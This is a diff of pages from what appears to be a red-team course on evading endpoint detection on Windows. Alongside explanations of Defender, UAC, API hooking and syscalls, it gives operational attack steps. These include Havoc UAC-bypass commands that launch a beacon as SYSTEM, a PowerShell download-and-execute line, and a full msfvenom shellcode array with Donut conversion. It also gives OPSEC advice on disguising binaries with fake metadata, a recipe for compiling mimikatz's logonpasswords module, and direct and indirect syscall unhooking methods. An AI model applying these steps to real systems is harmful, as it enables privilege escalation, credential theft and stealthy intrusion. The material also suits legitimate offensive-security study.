-<li><strong>Threat and Vulnerability Management:</strong> MDE offers tools to identify and remediate vulnerabilities across the organization's environment. MDA does not include this feature.</li>
-<li><strong>Attack Surface Reduction (ASR):</strong> MDE provides comprehensive ASR rules to minimize the attack surface and prevent exploit techniques. MDA has limited ASR capabilities.</li>
-<li><strong>Automated Investigation and Remediation:</strong> MDE uses AI and automation to automatically investigate and remediate threats. MDA does not have this capability.</li>
-<li><strong>Advanced Threat Hunting:</strong> MDE offers advanced threat hunting capabilities, allowing security analysts to perform detailed searches and analytics. MDA does not include threat hunting features.</li>
-<li><strong>Integration with Microsoft 365:</strong> MDE seamlessly integrates with Microsoft 365 and other enterprise security solutions, providing a unified security experience. MDA has limited integration with Microsoft 365.</li>
-<li><strong>Sandboxing and Detonation:</strong> MDE uses sandboxing to analyze and detonate suspicious files in a controlled environment, providing detailed insights into their behavior. MDA does not offer sandboxing.</li>
-<li><strong>Behavioral Analytics and Anomaly Detection:</strong> MDE employs advanced behavioral analytics and anomaly detection to identify sophisticated threats. MDA has basic behavioral monitoring.</li>
-<li><strong>Threat Intelligence and Analytics:</strong> MDE leverages Microsoft's Threat Intelligence to provide real-time insights and analytics. MDA has limited threat intelligence capabilities.</li>
-<li><strong>Centralized Management and Reporting:</strong> MDE offers centralized management, reporting, and alerting for enterprise environments, making it easier to manage security across multiple endpoints. MDA has basic management and reporting features.</li>
-</ul>
-<p>These differences highlight the advanced capabilities that Microsoft Defender for Endpoint (MDE) provides, making it suitable for enterprise environments with complex security needs.</p>
-<p>If you have any further questions or need more details, feel free to ask!</p>
-<p><img src="./images/howEDR.jpg" alt="Screenshot" />
-<img src="./images/static.jpg" alt="Screenshot" />
-<img src="./images/dynamic.jpg" alt="Screenshot" />
-<img src="./images/behavior.jpg" alt="Screenshot" /></p>
-<p><a href="https://www.edr-telemetry.com/windows.html">https://www.edr-telemetry.com/windows.html</a></p>
-<h1><a class="header" href="#heuristics" id="heuristics">Heuristics</a></h1>
-<h2><a class="header" href="#differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection" id="differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection">Differences in Capabilities of Heuristic Scanning in Microsoft Defender with and without Cloud Protection</a></h2>
-<h3><a class="header" href="#with-cloud-protection-turned-on" id="with-cloud-protection-turned-on">With Cloud Protection Turned On:</a></h3>
-<ul>
-<li><strong>Enhanced Detection:</strong> Cloud protection leverages Microsoft's vast cloud infrastructure to provide near-instant detection and blocking of new and emerging threats. This means that heuristic scanning can benefit from real-time updates and advanced machine learning models that are continuously updated in the cloud.</li>
-<li><strong>Behavior Analysis:</strong> The cloud can analyze suspicious behavior and patterns more effectively, providing a higher level of protection against sophisticated threats.</li>
-<li><strong>Faster Response:</strong> Cloud protection allows for quicker response times to new threats, as the cloud can process and analyze data much faster than local systems.</li>
-</ul>
-<h3><a class="header" href="#without-cloud-protection-turned-on" id="without-cloud-protection-turned-on">Without Cloud Protection Turned On:</a></h3>
-<ul>
-<li><strong>Local Heuristics:</strong> Heuristic scanning relies solely on the local database and predefined rules. This means it may not be as effective in detecting the latest threats that have not yet been added to the local database.</li>
-<li><strong>Limited Updates:</strong> Without cloud protection, updates to heuristic scanning capabilities are limited to periodic updates rather than real-time enhancements.</li>
-<li><strong>Slower Detection:</strong> The detection and response times may be slower, as the local system has to process and analyze threats without the additional computational power and data available in the cloud.</li>
-</ul>
-<h3><a class="header" href="#summary-1" id="summary-1">Summary</a></h3>
-<p>Enabling cloud protection significantly enhances the heuristic scanning capabilities of Microsoft Defender by providing real-time updates, advanced behavior analysis, and faster response times.</p>
-<p><strong>References:</strong></p>
-<ul>
-<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection">Overview of next-generation protection in Microsoft Defender for Endpoint</a></li>
-<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies at the core of Microsoft Defender Antivirus</a></li>
-</ul>
-<h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
-<p>User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
-<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
-<ol>
-<li>
-<p><strong>Permissions and Elevation</strong>
-When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
-</li>
-<li>
-<p><strong>Secure Desktop</strong>
-In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
-</li>
-<li>
-<p><strong>Levels of Notification</strong>
-UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
-</li>
-</ol>
-<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
-<ol>
-<li>
-<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
-</li>
-<li>
-<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
-</li>
-<li>
-<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
-</li>
-<li>
-<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
-</li>
-</ol>
-<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
-<h1><a class="header" href="#mitre-reference" id="mitre-reference">MITRE Reference</a></h1>
-<p><img src="./images/uac_mitre.jpg" alt="image" /></p>
-<p><img src="./images/uac_settings.jpg" alt="image" /></p>
-<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
-<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
-<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
-<p>Check if UAC is enabled (1 = enabled, 0 is disabled)</p>
-<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object EnableLua
+<h1><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h1>
+<h2><a class="header" href="#--what-is-position-independent-code-shellcode" id="--what-is-position-independent-code-shellcode">[-] What is Position Independent Code (Shellcode)?</a></h2>
+<p>Position Independent Code is code that is designed to execute regardless of where it resides in memory. This is in contrast to most programs, which might need to be loaded at a specific address to function correctly. Shellcode is a type of PIC, often written for exploits and payloads in hacking.</p>
+<p>The term “Shellcode” originally referred to code that, when executed, would spawn a command shell — hence the name. However, today, it generally refers to any payload used for exploitation.</p>
+<h3><a class="header" href="#--uses-of-shellcode" id="--uses-of-shellcode">[-] Uses of Shellcode:</a></h3>
+<p><em><strong>Exploitation</strong></em>: The primary use of shellcode is to exploit vulnerabilities in software, where the attacker can inject and execute their code.
+<em><strong>Payloads</strong></em>: Once a vulnerability is exploited, shellcode can be used to deliver payloads, which can range from spawning a reverse shell to injecting ransomware or establishing persistence.
+<em><strong>Bypassing Restrictions</strong></em>: Shellcode can be crafted to bypass security mechanisms, making detection and mitigation difficult.</p>
+<h3><a class="header" href="#--shellcode-vs-compiled-code-vs-interpreted-code" id="--shellcode-vs-compiled-code-vs-interpreted-code">[-] Shellcode vs. Compiled Code vs. Interpreted Code:</a></h3>
+<p><em><strong>Shellcode</strong></em>: As mentioned, shellcode is position-independent, designed to run from any location in memory. It doesn’t rely on external libraries or functions and should be small and efficient to work within the constraints of an exploit.</p>
+<p><em><strong>Compiled Code</strong></em>: This is code written in languages like C or C++ that is then compiled into machine code by a compiler. The result is a binary executable that the system can run. Unlike shellcode, compiled programs often rely on fixed memory addresses and external libraries.</p>
+<p><em><strong>Interpreted Code</strong></em>: This is code written in languages like Python, Ruby, or JavaScript that is executed line-by-line by an interpreter. It’s not converted into machine code; instead, the interpreter reads and executes it directly. This makes it generally slower than compiled code, but it’s more flexible and platform-independent.</p>
+<p>PE-File vs Shellcode</p>
+<pre><code class="language-bash">msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c                                            
+No encoder specified, outputting raw payload
+Payload size: 276 bytes
+Final size of c file: 1188 bytes
+unsigned char buf[] = 
+&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
+&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
+&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
+&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
+&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
+&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
+&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
+&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
+&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
+&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
+&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
+&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
+&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
+&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
+&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
+&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
+&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
+&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
+&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;
 </code></pre>
-<p>And to check which level it is :</p>
-<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object ConsentPromptBehaviorAdmin
+<h1><a class="header" href="#using-donut-to-convert-a-pe-to-shellcode" id="using-donut-to-convert-a-pe-to-shellcode">USing DONUT to convert a PE to Shellcode</a></h1>
+<pre><code class="language-powershell">donut.exe -e 1 -a x64 -o shellcode.donut -f 3 -i calcloader.exe -z 1 -b 1 -k 2
 </code></pre>
-<table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
-<tr><td>0</td><td>No Prompt</td></tr>
-<tr><td>1</td><td>Prompt for credential on the secure desktop</td></tr>
-<tr><td>2</td><td>Prompt for CONSENT on the secure desktop</td></tr>
-<tr><td>3</td><td>Prompt for Credentials on the normal desktop</td></tr>
-<tr><td>4</td><td>Prompt for CONSENT on the normal desktop</td></tr>
-<tr><td>5</td><td>Prompt for CONSENT for non-windows binaries</td></tr>
-</tbody></table>
-<p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
-<p>Fodhelper</p>
-<p>Demo with cmd.exe -&gt; medium level even if admin
-runas 
-show whoami / groups
-show system informer</p>
-<p>start beacon as unprivileged user</p>
-<p>whoami groups</p>
-<pre><code class="language-bash">sudo apt install mingw-w64 -y
+<p>In a Portable Executable (PE) file, the <code>unsigned char shellcode[]</code> array is typically stored in the <code>.data</code> section. This section is used for storing initialized global and static variables. The <code>.data</code> section is marked as readable and writable.</p>
+<p>Here's a brief overview of the relevant sections in a PE file:</p>
+<ul>
+<li><strong>.text</strong>: Contains the executable code.</li>
+<li><strong>.data</strong>: Contains initialized global and static variables.</li>
+<li><strong>.bss</strong>: Contains uninitialized global and static variables.</li>
+<li><strong>.rdata</strong>: Contains read-only data, such as string literals and constants.</li>
+</ul>
+<p>Since <code>shellcode</code> is an initialized global variable, it will be placed in the <code>.data</code> section of the PE file.</p>
+<p>To summarize, the <code>unsigned char shellcode[]</code> array in your code will be stored in the <code>.data</code> section of the PE file.</p>
+<p>Let's open CFF Explorer and dump the <code>data section</code>.</p>
+<p><img src="./images/cff_datasection.jpg" alt="image" /></p>
+<p>And open that file in Hexdump:</p>
+<p><img src="./images/hexdump_shell.jpg" alt="image" /></p>
+<p>Let's have a look, lets open powershell and run our loader.</p>
+<p><img src="./images/powershell_memloc.jpg" alt="image" /></p>
+<p>Then attach <code>x64dbg</code> to the localloader.exe and check for those two memory locations:</p>
+<p><img src="./images/xdbg_mem.jpg" alt="image" /></p>
+<p><img src="./images/xdbg_string.jpg" alt="image" /></p>
+<p><img src="./images/procmon_dlls.jpg" alt="image" /></p>
+<p><img src="./images/procmon_rwx.jpg" alt="image" /></p>
+<h2><a class="header" href="#img-srcimagesprocmon_shellcodejpg-altimage-" id="img-srcimagesprocmon_shellcodejpg-altimage-"><img src="./images/procmon_shellcode.jpg" alt="image" /></a></h2>
+<pre><code>**What is AMSI/Dotnet (managed/unmanaged code)**
+    The .NET Framework provides the Assembly.Load method which allows loading Common Object 
+    File Format (COFF) images like such as DLL’s and EXE’s. Assembly.Load can be supplied 
+    with a file path to load a DLL from disk, or with a byte array to load directly in memory.
 
-git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
-make
+Threatcheck/AMSI Trigger
+
+ClamAV
+    dotpeek/hexdump --canonical
+    strings -n 5
 </code></pre>
-<p>In Havoc -&gt; Script Manager Load .py</p>
-<p>Set Sleep to 10</p>
-<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
-uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
-uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
+<p>Shelcode formats (shellcode formatter etc)</p>
+<blockquote>
+<p>OPSEC HINT: Make sure your binaries loog legit, add metadata and and icon to the file!</p>
+</blockquote>
+<p>On Windows (requires SDK):
+<a href="https://dotnet.microsoft.com/en-us/">https://dotnet.microsoft.com/en-us/</a></p>
+<h2><a class="header" href="#cscexe-csharpdotnet" id="cscexe-csharpdotnet"><em><strong>csc.exe (CSharp/dotnet)</strong></em></a></h2>
+<pre><code class="language-code">c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:loader.exe loader.cs
+csc.exe /t:exe /out:$utilName /unsafe $katzPath
+</code></pre>
+<pre><code class="language-csharp">// AssemblyInfo.cs
+[assembly: AssemblyTitle(&quot;YourProductName&quot;)]
+[assembly: AssemblyDescription(&quot;Some description&quot;)]
+[assembly: AssemblyConfiguration(&quot;&quot;)]
+[assembly: AssemblyCompany(&quot;YourCompanyName&quot;)]
+[assembly: AssemblyProduct(&quot;YourProductName&quot;)]
+[assembly: AssemblyCopyright(&quot;© YourCompanyName&quot;)]
+[assembly: AssemblyTrademark(&quot;&quot;)]
+[assembly: AssemblyCulture(&quot;&quot;)]
+[assembly: AssemblyVersion(&quot;1.0.0.0&quot;)]
+[assembly: AssemblyFileVersion(&quot;1.0.0.0&quot;)]
+</code></pre>
+<pre><code class="language-powershell">csc -out:evil.exe -optimize- -win32icon:app.ico Program.cs AssemblyInfo.cs
+</code></pre>
+<p>You can extract metadata from any binary with this simple program.</p>
+<pre><code class="language-powershell">dotnet new console -n AssemblyInfoExtractor
+cd AssemblyInfoExtractor
+</code></pre>
+<p>Create a &quot;Program.cs&quot; file here</p>
+<pre><code class="language-csharp">using System;
+using System.Reflection;
+
+namespace AssemblyInfoExtractor
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine(&quot;Please provide the path to the assembly.&quot;);
+                return;
+            }
+
+            string assemblyPath = args[0];
+            try
+            {
+                var assembly = Assembly.LoadFile(assemblyPath);
+                var assemblyName = assembly.GetName();
+
+                Console.WriteLine($&quot;Assembly Full Name: {assemblyName.FullName}&quot;);
+                Console.WriteLine($&quot;Version: {assemblyName.Version}&quot;);
+
+                var attributes = assembly.GetCustomAttributesData();
+                foreach (var attr in attributes)
+                {
+                    if (attr.AttributeType == typeof(AssemblyCompanyAttribute))
+                    {
+                        Console.WriteLine($&quot;Company: {attr.ConstructorArguments[0].Value}&quot;);
+                    }
+                    if (attr.AttributeType == typeof(AssemblyProductAttribute))
+                    {
+                        Console.WriteLine($&quot;Product: {attr.ConstructorArguments[0].Value}&quot;);
+                    }
+                    if (attr.AttributeType == typeof(AssemblyCopyrightAttribute))
+                    {
+                        Console.WriteLine($&quot;Copyright: {attr.ConstructorArguments[0].Value}&quot;);
+                    }
+                    if (attr.AttributeType == typeof(AssemblyTitleAttribute))
+                    {
+                        Console.WriteLine($&quot;Title: {attr.ConstructorArguments[0].Value}&quot;);
+                    }
+                    if (attr.AttributeType == typeof(AssemblyDescriptionAttribute))
+                    {
+                        Console.WriteLine($&quot;Description: {attr.ConstructorArguments[0].Value}&quot;);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($&quot;Error: {ex.Message}&quot;);
+            }
+        }
+    }
+}
+</code></pre>
+<pre><code class="language-powershell">dotnet build
+dotnet run --project C:\Temp\AssemblyInfoExtractor\AssemblyInfoExtractor.csproj C:\Temp\LocalLoader.exe
+</code></pre>
+<p>or run the exe:</p>
+<pre><code class="language-powershell">C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;dir
+ Volume in drive C is Windows
+ Volume Serial Number is 368D-BFAA
+
+ Directory of C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0
+
+02/21/2025  04:35 PM    &lt;DIR&gt;          .
+02/21/2025  04:35 PM    &lt;DIR&gt;          ..
+02/21/2025  04:31 PM               455 AssemblyInfoExtractor.deps.json
+02/21/2025  04:35 PM             6,656 AssemblyInfoExtractor.dll
+02/21/2025  04:35 PM           145,408 AssemblyInfoExtractor.exe
+02/21/2025  04:35 PM            11,080 AssemblyInfoExtractor.pdb
+02/21/2025  04:31 PM               268 AssemblyInfoExtractor.runtimeconfig.json
+               5 File(s)        163,867 bytes
+               2 Dir(s)   2,280,939,520 bytes free
+
+C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;AssemblyInfoExtractor.exe C:\Temp\LocalLoader.exe
+Assembly Full Name: LocalLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
+Version: 1.0.0.0
+Title: LocalLoader
+Description:
+Company:
+Product: LocalLoader
+Copyright: Copyright ©  2025
+</code></pre>
+<h2><a class="header" href="#msbuildexe-csharp-c" id="msbuildexe-csharp-c"><em><strong>msbuild.exe (CSharp, C++)</strong></em></a></h2>
+<pre><code class="language-code">msbuild buildapp.csproj -t:HelloWorld
+msbuild mimidogz.sln /t:Build /p:Configuration=Release /p:Platform=x64
+</code></pre>
+<pre><code class="language-code">@echo off
+set msBuildExe=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;
+set solutionsFile=&quot;C:\TestProject\mySln.sln&quot;
+rem Build the solutions:  
+%msBuildExe% /t:Build /p:Configuration=Release /p:Platform=x64 %solutionsFile%
 </code></pre>
 <hr />
-<p>Priv Esc.</p>
-<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
-</code></pre>
-<h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
-<p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
-<p>Explain hooking with <em><strong>FRIDA</strong></em></p>
-<p>x64dbg</p>
-<p>HookChecker mr. Un1c0d3r</p>
-<p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
-<p>command prompt visual studio 2022</p>
-<p>dumpbin.exe /exports file.dll</p>
-<p>Screenshot IDA JUMP</p>
-<p>https://github.com/Almorabea/HookSweeper</p>
-<p>https://github.com/Mr-Un1k0d3r/EDRs
-Hook_finder64.exe</p>
-<p>https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
-compile in visual studio</p>
-<p>Bitdefender install -&gt; 102 fnctions hooked</p>
-<p>windgb:
-u NtOpenProcess
-!chkimg ntdll
-needs symbols in windbg
-.sympath srv*https://msdl.microsoft.com/download/symbols
-!sym noisy;.reload /f /v</p>
-<pre><code>u NtReadVirtualMemory
-ntdll!NtReadVirtualMemory:
-00007ffd`3ef0dcc0 e95b331600      jmp     00007ffd`3f071020
-00007ffd`3ef0dcc5 cc              int     3
-00007ffd`3ef0dcc6 cc              int     3
-00007ffd`3ef0dcc7 cc              int     3
-00007ffd`3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
-00007ffd`3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd`3ef0dcd5)
-00007ffd`3ef0dcd2 0f05            syscall
-00007ffd`3ef0dcd4 c3              ret
-</code></pre>
-<p>then look at the jump address and disassemble:</p>
-<pre><code>u 00007ffd`3f071020
-00007ffd`3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
-00007ffd`3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx
-00007ffd`3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
-00007ffd`3f071040 ff1522000000    call    qword ptr [00007ffd`3f071068]
-00007ffd`3f071046 9c              pushfq
-00007ffd`3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
-00007ffd`3f071053 740a            je      00007ffd`3f07105f
-00007ffd`3f071055 9d              popfq
-</code></pre>
-<p><strong>call qword ptr [00007ffd3f071068]:</strong> This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.</p>
-<p><strong>Examine 00007ffd3f071068:</strong> Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.</p>
-<pre><code>dq 00007ffd3f071068
-00007ffd`3f071068  00007df4`cda31000 cccccccc`cccccccc
-00007ffd`3f071078  cccccccc`cccccccc 24a48d48`36363636
-00007ffd`3f071088  89483636`ffffff00 b948ffff`ff38248c
-00007ffd`3f071098  00007df4`cda20dc0 489c0000`002215ff
-00007ffd`3f0710a8  fffffffe`f82484f7 36369d0a`74ffffff
-00007ffd`3f0710b8  9dfffffe`f024a4ff cccccccc`ccccccc3
-00007ffd`3f0710c8  00007df4`cda31000 cccccccc`cccccccc
-00007ffd`3f0710d8  cccccccc`cccccccc 24a48d48`36363636
-</code></pre>
-<p>The important part is 00007df4cda31000. This is the address where the <em>real</em> hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).</p>
-<p>Next step:</p>
-<p>Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.</p>
-<pre><code class="language-code">u 00007df4`cda31000
-00007df4`cda31000 9c              pushfq
-00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
-00007df4`cda3100c 7515            jne     00007df4`cda31023
-00007df4`cda3100e 9d              popfq
-00007df4`cda3100f 488b4910        mov     rcx,qword ptr [rcx+10h]
-00007df4`cda31013 48894c24f8      mov     qword ptr [rsp-8],rcx
-00007df4`cda31018 488b8c2440ffffff mov     rcx,qword ptr [rsp-0C0h]
-00007df4`cda31020 c20001          ret     100h
-</code></pre>
-<pre><code class="language-code">!address 00007df4`cda30000
+<h2><a class="header" href="#clexe-c-visual-studio" id="clexe-c-visual-studio"><em><strong>CL.exe (C)</strong></em> Visual Studio</a></h2>
+<pre><code class="language-code">Developer Prompt Visual Studio
+cl.exe hello.c /out:hello.exe /exe
 
-Usage:                  &lt;unknown&gt;
-Base Address:           00007df4`cda30000
-End Address:            00007df4`cda31000
-Region Size:            00000000`00001000 (   4.000 kB)
-State:                  00001000          MEM_COMMIT
-Protect:                00000002          PAGE_READONLY
-Type:                   00020000          MEM_PRIVATE
-Allocation Base:        00007df4`cda30000
-Allocation Protect:     00000002          PAGE_READONLY
+git clone https://github.com/gentilkiwi/mimikatz.git
 
-
-Content source: 1 (target), length: 1000
+cl.exe /Zi /I inc\ mimikatz\modules\misc\kuhl_m_misc_citrix.c modules\kull_m_kernel.c 
+modules\kull_m_memory.c modules\kull_m_minidump.c modules\kull_m_output.c 
+modules\kull_m_process.c modules\kull_m_string.c lib\x64\ntdll.min.lib 
+/link kernel32.lib user32.lib advapi32.lib shell32.lib crypt32.lib rpcrt4.lib vcruntime.lib ucrt.lib 
+/entry:kuhl_m_misc_citrix_logonpasswords 
+/subsystem:console
 </code></pre>
-<p>SylentStrike (Unhooking) custom EDR</p>
-<p>https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/</p>
-<p>Unhooking by releading ntdll.dll into memory -&gt; some EDR's detect loading NTDLL from disk...</p>
-<p>Bypass, create a suspended process (this will only load NTDLL, not the EDR dll) -&gt; then copy the clean ntdll from the suspended process and overwrite it in the current process, unhooking the functions.</p>
-<p>PROCESS HOLLOWING (Freeze)</p>
-<p>https://hawk-eye.io/2023/06/freeze-a-payload-toolkit-for-bypassing-edrs-using-suspended-processes/</p>
-<p>This can also be used to enumerate syscalls without touching NTDLL!</p>
-<p>https://cymulate.com/blog/extracting-syscalls-from-a-suspended-process/</p>
-<h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
-<p><a href="https://hfiref0x.github.io/X86_64/NT10_syscalls.html">https://hfiref0x.github.io/X86_64/NT10_syscalls.html</a></p>
-<table><thead><tr><th>System Call</th><th>Windows 10</th><th>Description</th></tr></thead><tbody>
-<tr><td><code>NtCreateThread</code></td><td>0x004e</td><td>Creates a thread to execute within the virtual address space of the calling process.</td></tr>
-<tr><td><code>NtAllocateVirtualMemory</code></td><td>0x0018</td><td>Allocates memory in the virtual address space of the calling process.</td></tr>
-<tr><td><code>NtWriteVirtualMemory</code></td><td>0x003a</td><td></td></tr>
-<tr><td><code>NtWaitForSingleObject</code></td><td>0x0004</td><td>Waits until the specified object is in the signaled state or the time-out interval elapses.</td></tr>
-</tbody></table>
-<p>https://github.com/joshfinley/SyscallDumper</p>
-<p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
-<p>https://github.com/fin3ss3g0d/HookFinder</p>
-<pre><code class="language-powershell">PS C:\git\EDRs&gt; .\hook_finder64.exe C:\windows\system32\ntdll.dll
-</code></pre>
-<p>https://www.secunnix.com/en/blog/cat-and-mouse-game</p>
-<h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
-<p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
-<p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
-<blockquote>
-<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)
-with memory forensics (i.e. volatilty) this can be detected, EDR's are in a tough spot since they need to do this in real time!</p>
-</blockquote>
-<p><a href="https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s">https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s</a></p>
-<p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
-<p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
-<h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
-<p>Indirect system calls are similar to the direct system calls technique in terms of their working logic. But beyond that, they have a few minor differences in the processing of system calls.</p>
-<p>In the direct syscall technique, while the process belonging to ntdll.dll is completely outside the event and the RET commands are in the program itself instead of this DLL, in the case of indirect syscall, since <code>the calls are executed through ntdll.dll</code>, they are perceived as normal by EDR processes. Okay. So, if you ask how EDR cannot perform the hook operation, the logic is actually simple. During the execution of the malicious code, <code>the JMP command goes to the block where the system call is located</code>, instead of pointing to the entry point (starting point) of <code>ntdll.dll</code>. 
-Thus, a device unaware of ntdll.dll It is a little more difficult to detect since there is no execution process.</p>
-<p><img src="./images/syscall_indirect.jpg" alt="Screenshot" /></p>
-<p>Although both techniques still work, the indirect syscall method can help develop less detectable malware. Note that these are methods to avoid user mode hooking. If you are dealing with a security solution that does kernel mode hooking, this techniques can be identified.
